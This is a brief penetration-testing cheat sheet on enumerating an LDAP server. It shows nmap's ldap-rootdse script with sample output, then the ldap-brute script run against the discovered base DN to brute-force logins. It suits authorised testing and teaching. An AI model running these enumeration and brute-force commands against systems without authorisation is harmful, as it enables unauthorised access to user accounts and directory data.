# LDAP Enumeration
An LDAP server can be used to glean information about users and the target system itself if not configured properly. This cheat sheet will prived the basic syntax of tools that can be used to attempt to gather information from LDAP on a LINUX host.
## NMAP (ldap-rootdse) NSE Script
This script should be ran first, as this will provide the basic information for the next NSE script that we will use.
```
root@attacker:~# nmap -p 389 --script ldap-rootdse (TARGET IP ADDRESS) -vv
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack ttl 63
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       supportedLDAPVersion: 3
|       namingContexts: dc=targetbox,dc=target
|       supportedExtension: 1.3.6.1.4.1.1466.20037
|_      subschemaSubentry: cn=schema

```
## NMAP (ldap-brute) NSE Script
Now, we can use the dc and cn values in our brute force attempt as so,
```
root@attacker-machine:~# nmap -p 389 --script ldap-brute --script-args \
ldap.base='"cn=schema,dc=targetbox,dc=target"' (TARGET IP ADDRESS) -vv
```
You can change the Common Name, `cn`, attribute to attempt to get more data from the target system.
